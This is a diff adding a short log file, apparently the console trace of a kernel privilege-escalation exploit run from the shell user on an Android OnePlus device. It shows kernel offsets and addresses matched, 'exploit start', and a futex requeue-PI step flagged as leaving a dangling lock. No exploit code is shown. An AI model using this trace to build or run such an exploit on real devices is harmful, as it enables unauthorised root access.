@@ -1,0 +1,15 @@
+[33m[*] [0mkernel: 4.14.186-g844fd19c6
+[32m[+] [0moffsets matched: 4.14.186-g844fd19c6
+[32m[+] [0mstartup context pid=14332 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=14332 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=14332 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=14332 phys_offset=0000000040000000 kernel_phys_load=0000000040080000 delta=0000000000080000 slide_logger=ffffff8001cd1500 bootid_data=ffffff8002122670 init_task=ffffff8001cdbec0 root_tg=ffffff8001ccdb78 sysctl_bootid=ffffff8002122670
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mDIAG=8: skip heap spray (real-lock route, no fake page)
+[33m[*] [0mconsumer: baseline sched_setattr on self tid=14335 (no PI)
+[33m[*] [0mconsumer: self prio after BATCH nice=19 -> 39
+[33m[*] [0mconsumer: baseline ret=0 errno=0
+[33m[*] [0mwaiter: prio at block -> 20
+[33m[*] [0mCMP_REQUEUE_PI ret=-1 errno=35 (EDEADLK => dangling)
+[33m[*] [0mconsumer: pre-sched tid=14333
+[33m[*] [0mDIAG=8: run_main_route_threads returned OK
